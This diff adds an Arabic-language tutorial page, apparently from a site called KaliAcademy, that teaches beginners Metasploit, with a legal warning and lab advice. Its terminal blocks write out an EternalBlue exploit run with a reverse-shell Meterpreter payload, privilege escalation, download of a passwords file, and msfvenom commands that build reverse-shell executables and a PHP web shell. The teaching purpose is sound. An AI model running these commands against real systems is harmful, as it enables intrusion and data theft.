@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>دليل Metasploit للمبتدئين 2026 | اختبار الاختراق العملي | KaliAcademy</title>
+<meta name="description" content="دليل عملي شامل لاستخدام Metasploit Framework في اختبار الاختراق 2026 - من الأساسيات للاحتراف مع أمثلة حقيقية.">
+<meta name="keywords" content="Metasploit, MSF, msfconsole, اختبار الاختراق, Exploit, Payload, Metasploit بالعربي, penetration testing">
+<meta name="author" content="Kali Academy">
+<link rel="canonical" href="https://kali-academy.github.io/article-metasploit-beginners-2026.html">
+<link rel="icon" type="image/png" href="images/logo.png">
+<meta property="og:title" content="دليل Metasploit للمبتدئين 2026 | KaliAcademy">
+<meta property="og:description" content="تعلم Metasploit Framework من الصفر - دليل عملي شامل مع أمثلة حقيقية.">
+<meta property="og:type" content="article">
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/enhanced.css">
+<link rel="stylesheet" href="css/cyber-theme.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+.article-page { max-width: 860px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+.article-header { padding: 2rem 0 2rem; border-bottom: 1px solid var(--border); margin-bottom: 2.5rem; }
+.article-category { display: inline-flex; align-items: center; gap: 6px; padding: 4px 14px; border-radius: 20px; background: rgba(255,0,128,0.1); border: 1px solid rgba(255,0,128,0.3); color: #ff0080; font-family: 'Share Tech Mono', monospace; font-size: 0.65rem; letter-spacing: 2px; margin-bottom: 1rem; }
+.article-title { font-family: 'Cairo', sans-serif; font-size: clamp(1.6rem, 4vw, 2.4rem); font-weight: 800; color: #fff; line-height: 1.4; margin-bottom: 1rem; }
+.article-title span { color: #ff0080; }
+.article-meta { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; color: var(--text-muted); font-family: 'Cairo', sans-serif; font-size: 0.82rem; }
+.article-meta i { color: #ff0080; margin-left: 4px; }
+.article-body h2 { font-family: 'Cairo', sans-serif; font-size: 1.4rem; font-weight: 800; color: #fff; margin: 2rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 2px solid rgba(255,0,128,0.25); display: flex; align-items: center; gap: 8px; }
+.article-body h2 .h-icon { color: #ff0080; }
+.article-body h3 { font-family: 'Cairo', sans-serif; font-size: 1.05rem; font-weight: 700; color: var(--primary); margin: 1.3rem 0 0.6rem; }
+.article-body p { font-family: 'Cairo', sans-serif; color: rgba(255,255,255,0.8); line-height: 1.9; margin-bottom: 1rem; font-size: 0.95rem; }
+.article-body ul, .article-body ol { padding-right: 1.5rem; margin-bottom: 1rem; }
+.article-body li { font-family: 'Cairo', sans-serif; color: rgba(255,255,255,0.75); line-height: 2; font-size: 0.93rem; }
+.terminal-block { background: #010e1a; border: 1px solid rgba(0,255,65,0.2); border-radius: 12px; overflow: hidden; margin: 1.2rem 0; }
+.terminal-block .tb-header { display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: rgba(0,0,0,0.4); border-bottom: 1px solid rgba(0,255,65,0.1); }
+.tb-dot { width: 10px; height: 10px; border-radius: 50%; }
+.tb-red { background: #ff5f57; } .tb-yellow { background: #febc2e; } .tb-green { background: #28c840; }
+.tb-title { font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; color: rgba(0,255,65,0.5); margin-right: auto; }
+.tb-copy { background: none; border: 1px solid rgba(0,255,65,0.2); color: rgba(0,255,65,0.5); padding: 2px 10px; border-radius: 4px; font-family: 'Share Tech Mono', monospace; font-size: 0.65rem; cursor: pointer; transition: all 0.2s; }
+.tb-copy:hover { border-color: var(--primary); color: var(--primary); }
+.terminal-block pre { padding: 1rem 1.3rem; overflow-x: auto; font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; color: #e0ffe8; line-height: 1.8; margin: 0; }
+.terminal-block pre .cmd { color: var(--primary); }
+.terminal-block pre .output { color: rgba(255,255,255,0.6); }
+.terminal-block pre .comment { color: rgba(0,255,65,0.4); }
+.highlight-box { background: rgba(255,0,128,0.05); border: 1px solid rgba(255,0,128,0.2); border-right: 4px solid #ff0080; border-radius: 8px; padding: 1rem 1.3rem; margin: 1.2rem 0; }
+.highlight-box.warn { background: rgba(255,200,0,0.05); border-color: rgba(255,200,0,0.2); border-right-color: #ffcc00; }
+.article-cta { background: linear-gradient(135deg, rgba(255,0,128,0.08), rgba(4,22,40,0.95)); border: 1px solid rgba(255,0,128,0.3); border-radius: 16px; padding: 2rem; text-align: center; margin-top: 3rem; }
+.article-cta h3 { font-family: 'Cairo', sans-serif; font-size: 1.3rem; font-weight: 800; margin-bottom: 0.7rem; }
+.article-cta p { color: var(--text-muted); font-family: 'Cairo', sans-serif; margin-bottom: 1.3rem; }
+</style>
+</head>
+<body class="grid-bg">
+<canvas id="matrix-canvas"></canvas>
+<script src="js/disclaimer.js"></script>
+<script src="js/social-bar.js"></script>
+<script src="js/free-offer.js"></script>
+<script src="js/site-init.js"></script>
+
+<header class="site-header">
+  <a href="index.html" class="logo">
+    <div class="logo-icon"><img src="images/logo.png" alt="Kali Academy Logo" style="width:44px;height:44px;object-fit:contain;"></div>
+    <div><span class="logo-text">KALI ACADEMY</span><span class="logo-sub">CYBER SECURITY LEARNING</span></div>
+  </a>
+  <ul class="nav-menu">
+    <li><a href="index.html" class="nav-link"><i class="fas fa-home"></i> الرئيسية</a></li>
+    <li><a href="commands.html" class="nav-link"><i class="fas fa-terminal"></i> الأوامر</a></li>
+    <li><a href="tutorials.html" class="nav-link"><i class="fas fa-book-open"></i> الدروس</a></li>
+    <li><a href="tools.html" class="nav-link"><i class="fas fa-tools"></i> الأدوات</a></li>
+    <li><a href="articles.html" class="nav-link active"><i class="fas fa-newspaper"></i> المقالات</a></li>
+  </ul>
+  <div class="hamburger"><span></span><span></span><span></span></div>
+</header>
+<div class="mobile-menu">
+  <a href="index.html" class="nav-link mobile-nav-link"><i class="fas fa-home"></i> الرئيسية</a>
+  <a href="articles.html" class="nav-link mobile-nav-link active"><i class="fas fa-newspaper"></i> المقالات</a>
+</div>
+
+<div class="main-wrapper" style="padding-top: var(--header-height);">
+<div class="article-page">
+
+  <div class="article-header">
+    <div class="article-category"><i class="fas fa-bomb"></i> METASPLOIT</div>
+    <h1 class="article-title">دليل <span>Metasploit</span> الشامل للمبتدئين 2026</h1>
+    <div class="article-meta">
+      <span><i class="fas fa-user-edit"></i> KALI ACADEMY</span>
+      <span><i class="fas fa-calendar"></i> مارس 2026</span>
+      <span><i class="fas fa-clock"></i> 15 دقيقة قراءة</span>
+      <span><i class="fas fa-eye"></i> 6,500+ قراءة</span>
+    </div>
+  </div>
+
+  <div class="article-body">
+
+    <div class="highlight-box warn">
+      <strong style="color:#ffcc00;">⚠️ تحذير قانوني:</strong><br>
+      استخدم Metasploit <strong>فقط</strong> على أنظمة تملكها أو لديك إذن خطي باختبارها. الاستخدام غير المصرح به جريمة جنائية في معظم الدول.
+    </div>
+
+    <h2><span class="h-icon">💥</span> ما هو Metasploit Framework؟</h2>
+    <p>Metasploit Framework هو أشهر إطار عمل لاختبار الاختراق. يحتوي على آلاف الـ Exploits والـ Payloads الجاهزة للاستخدام. تم تطويره بلغة Ruby ويعمل على جميع أنظمة التشغيل الرئيسية.</p>
+
+    <h2><span class="h-icon">🚀</span> تشغيل Metasploit</h2>
+    <div class="terminal-block">
+      <div class="tb-header">
+        <div class="tb-dot tb-red"></div><div class="tb-dot tb-yellow"></div><div class="tb-dot tb-green"></div>
+        <span class="tb-title">root@kali:~$</span>
+        <button class="tb-copy" onclick="copyBlock(this)">نسخ</button>
+      </div>
+      <pre><span class="cmd"># تشغيل قاعدة البيانات أولاً</span>
+<span class="cmd">sudo service postgresql start</span>
+<span class="output">[ ok ] Starting postgresql (via systemctl)...</span>
+
+<span class="cmd"># تشغيل Metasploit</span>
+<span class="cmd">msfconsole</span>
+<span class="output">       =[ metasploit v6.4.0 ]=
++ -- --=[ 2400+ exploits | 1200+ auxiliary | 420+ post ]
++ -- --=[ 980+ payloads | 60+ encoders | 10+ nops ]</span>
+<span class="cmd">msf6 ></span></pre>
+    </div>
+
+    <h2><span class="h-icon">🔧</span> أوامر Metasploit الأساسية</h2>
+    <div class="terminal-block">
+      <div class="tb-header">
+        <div class="tb-dot tb-red"></div><div class="tb-dot tb-yellow"></div><div class="tb-dot tb-green"></div>
+        <span class="tb-title">msf6 ></span>
+        <button class="tb-copy" onclick="copyBlock(this)">نسخ</button>
+      </div>
+      <pre><span class="comment"># البحث عن Exploit</span>
+<span class="cmd">msf6 > search type:exploit platform:windows ms17-010</span>
+
+<span class="comment"># اختيار الـ Exploit</span>
+<span class="cmd">msf6 > use exploit/windows/smb/ms17_010_eternalblue</span>
+
+<span class="comment"># عرض الخيارات المطلوبة</span>
+<span class="cmd">msf6 exploit(ms17_010_eternalblue) > show options</span>
+
+<span class="comment"># تعيين الهدف</span>
+<span class="cmd">msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50</span>
+
+<span class="comment"># اختيار الـ Payload</span>
+<span class="cmd">msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+
+<span class="comment"># تعيين عنوان IP الخاص بنا</span>
+<span class="cmd">msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.100</span>
+
+<span class="comment"># تشغيل الـ Exploit</span>
+<span class="cmd">msf6 exploit(ms17_010_eternalblue) > run</span></pre>
+    </div>
+
+    <h2><span class="h-icon">🐚</span> Meterpreter - الـ Shell المتقدم</h2>
+    <p>بعد الاختراق الناجح، تحصل على Meterpreter Shell - وهو Shell متقدم يوفر إمكانيات قوية:</p>
+    <div class="terminal-block">
+      <div class="tb-header">
+        <div class="tb-dot tb-red"></div><div class="tb-dot tb-yellow"></div><div class="tb-dot tb-green"></div>
+        <span class="tb-title">meterpreter ></span>
+        <button class="tb-copy" onclick="copyBlock(this)">نسخ</button>
+      </div>
+      <pre><span class="comment"># معلومات النظام</span>
+<span class="cmd">meterpreter > sysinfo</span>
+<span class="output">Computer : DESKTOP-TARGET
+OS       : Windows 10 (Build 19044)
+Architecture : x64</span>
+
+<span class="comment"># رفع صلاحيات</span>
+<span class="cmd">meterpreter > getsystem</span>
+<span class="output">...got system via technique 1 (Named Pipe Impersonation)</span>
+
+<span class="comment"># تصوير الشاشة</span>
+<span class="cmd">meterpreter > screenshot</span>
+
+<span class="comment"># تنزيل ملف</span>
+<span class="cmd">meterpreter > download C:/Users/Admin/passwords.txt</span>
+
+<span class="comment"># تشغيل Shell عادي</span>
+<span class="cmd">meterpreter > shell</span></pre>
+    </div>
+
+    <h2><span class="h-icon">🎯</span> msfvenom - إنشاء Payloads</h2>
+    <div class="terminal-block">
+      <div class="tb-header">
+        <div class="tb-dot tb-red"></div><div class="tb-dot tb-yellow"></div><div class="tb-dot tb-green"></div>
+        <span class="tb-title">root@kali:~$</span>
+        <button class="tb-copy" onclick="copyBlock(this)">نسخ</button>
+      </div>
+      <pre><span class="comment"># Payload لـ Windows EXE</span>
+<span class="cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f exe -o payload.exe</span>
+
+<span class="comment"># Payload لـ Linux ELF</span>
+<span class="cmd">msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o payload.elf</span>
+
+<span class="comment"># Web Shell PHP</span>
+<span class="cmd">msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f raw -o shell.php</span></pre>
+    </div>
+
+    <h2><span class="h-icon">📋</span> أوامر msfconsole المهمة</h2>
+    <ul>
+      <li><code style="color:var(--primary);">search</code> — البحث عن Exploits والـ Modules</li>
+      <li><code style="color:var(--primary);">info</code> — معلومات تفصيلية عن الـ Module</li>
+      <li><code style="color:var(--primary);">show payloads</code> — عرض الـ Payloads المتوافقة</li>
+      <li><code style="color:var(--primary);">set / setg</code> — تعيين المتغيرات (setg عالمي)</li>
+      <li><code style="color:var(--primary);">sessions -l</code> — عرض جميع الجلسات المفتوحة</li>
+      <li><code style="color:var(--primary);">sessions -i 1</code> — الدخول لجلسة معينة</li>
+      <li><code style="color:var(--primary);">background</code> — إخفاء الجلسة للخلفية</li>
+      <li><code style="color:var(--primary);">db_nmap -sV target</code> — نسخ Nmap مع حفظ النتائج</li>
+    </ul>
+
+    <div class="highlight-box">
+      <strong style="color:#ff0080;">💡 نصيحة للمختبرين:</strong><br>
+      دائماً اختبر في بيئة معزولة (Lab) قبل التطبيق. استخدم Metasploitable 2/3 كهدف تدريبي آمن. 
+    </div>
+
+  </div>
+
+  <div class="article-cta">
+    <h3>تعمق أكثر في Metasploit 💥</h3>
+    <p>شاهد درس Metasploit التفاعلي الكامل مع أمثلة عملية ومعلومات حصرية.</p>
+    <a href="tutorials.html#metasploit" class="btn btn-primary" style="background:linear-gradient(135deg,#ff0080,#cc0066);border:none;font-size:0.95rem;padding:12px 28px;"><i class="fas fa-book-open"></i> شاهد الدرس الكامل</a>
+  </div>
+
+</div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-bottom" style="max-width:1200px;margin:0 auto;text-align:center;padding:1.5rem;font-size:0.8rem;color:var(--text-muted);">
+    ⚠️ للأغراض التعليمية فقط | © 2026 Kali Academy
+  </div>
+</footer>
+<script src="js/matrix.js"></script>
+<script src="js/main.js"></script>
+<script>
+function copyBlock(btn) {
+  const pre = btn.closest('.terminal-block').querySelector('pre');
+  const text = pre.innerText || pre.textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ تم';
+    setTimeout(() => btn.textContent = 'نسخ', 2000);
+  });
+}
+</script>
+</body>
+</html>
